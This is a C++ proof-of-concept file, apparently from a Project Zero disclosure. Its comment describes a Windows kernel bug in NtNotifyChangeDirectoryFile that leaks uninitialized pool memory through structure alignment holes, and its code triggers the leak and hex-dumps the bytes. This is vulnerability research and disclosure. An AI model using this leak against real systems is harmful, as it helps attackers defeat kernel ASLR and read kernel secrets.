@@ -1,0 +1,110 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1169
+
+We have discovered that the nt!NtNotifyChangeDirectoryFile system call discloses portions of uninitialized pool memory to user-mode clients, due to output structure alignment holes.
+
+On our test Windows 10 32-bit workstation, an example layout of the output buffer is as follows:
+
+--- cut ---
+00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ff ff ................
+00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ?? ?? ................
+--- cut ---
+
+Where 00 denote bytes which are properly initialized, while ff indicate uninitialized values copied back to user-mode. The output data is returned in a list of FILE_NOTIFY_INFORMATION structures [1]. If we map the above shadow bytes to the structure definition, it turns out that the uninitialized bytes correspond to the alignment hole between the end of the FileName string and the beginning of the adjacent FILE_NOTIFY_INFORMATION structure, if that string is of an odd length (and therefore not 4-byte aligned).
+
+The issue can be reproduced by running the attached proof-of-concept program on a system with the Special Pools mechanism enabled for ntoskrnl.exe. Then, it is clearly visible that bytes at the aforementioned offsets are equal to the markers inserted by Special Pools, and would otherwise contain leftover data that was previously stored in that memory region:
+
+--- cut ---
+00000000: 10 00 00 00 04 00 00 00 02 00 00 00 62 00[91 91]............b...
+00000010: 00 00 00 00 05 00 00 00 02 00 00 00 63 00 ?? ?? ............c...
+--- cut ---
+00000000: 10 00 00 00 04 00 00 00 02 00 00 00 62 00[3d 3d]............b.==
+00000010: 00 00 00 00 05 00 00 00 02 00 00 00 63 00 ?? ?? ............c...
+--- cut ---
+
+Repeatedly triggering the vulnerability could allow local authenticated attackers to defeat certain exploit mitigations (kernel ASLR) or read other secrets stored in the kernel address space.
+*/
+
+#include <Windows.h>
+#include <cstdio>
+
+VOID PrintHex(PBYTE Data, ULONG dwBytes) {
+  for (ULONG i = 0; i < dwBytes; i += 16) {
+    printf("%.8x: ", i);
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes) {
+        printf("%.2x ", Data[i + j]);
+      }
+      else {
+        printf("?? ");
+      }
+    }
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes && Data[i + j] >= 0x20 && Data[i + j] <= 0x7e) {
+        printf("%c", Data[i + j]);
+      }
+      else {
+        printf(".");
+      }
+    }
+
+    printf("\n");
+  }
+}
+
+DWORD ThreadRoutine(LPVOID lpParameter) {
+  // Wait for the main thread to call ReadDirectoryChanges().
+  Sleep(500);
+
+  // Perform a filesystem operation which results in two records (FILE_ACTION_RENAMED_OLD_NAME and FILE_ACTION_RENAMED_NEW_NAME)
+  // being returned at once.
+  MoveFile(L"a\\b", L"a\\c");
+
+  return 0;
+}
+
+int main() {
+  // Create a local "a" directory.
+  if (!CreateDirectory(L"a", NULL)) {
+    printf("CreateDirectory failed, %d\n", GetLastError());
+    return 1;
+  }
+
+  // Open the newly created directory.
+  HANDLE hDirectory = CreateFile(L"a", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
+  if (hDirectory == INVALID_HANDLE_VALUE) {
+    printf("CreateFile(a) failed, %d\n", GetLastError());
+    RemoveDirectory(L"a");
+    return 1;
+  }
+
+  // Create a new file in the "a" directory.
+  HANDLE hNewFile = CreateFile(L"a\\b", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
+  if (hNewFile != INVALID_HANDLE_VALUE) {
+    CloseHandle(hNewFile);
+  }
+
+  // Create a new thread which will modify the directory (rename a file within).
+  CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ThreadRoutine, NULL, 0, NULL);
+
+  // Wait for changes in the directory and read them into a 1024-byte buffer.
+  BYTE buffer[1024] = { /* zero padding */ };
+  DWORD BytesRead = 0;
+  if (!ReadDirectoryChangesW(hDirectory, buffer, sizeof(buffer), FALSE, FILE_NOTIFY_CHANGE_FILE_NAME, &BytesRead, NULL, NULL)) {
+    printf("ReadDirectoryChanges failed, %d\n", GetLastError());
+    DeleteFile(L"a\\c");
+    RemoveDirectory(L"a");
+    return 1;
+  }
+
+  // Dump the output on screen.
+  PrintHex(buffer, BytesRead);
+  
+  // Free resources.
+  DeleteFile(L"a\\c");
+  RemoveDirectory(L"a");
+
+  return 0;
+}
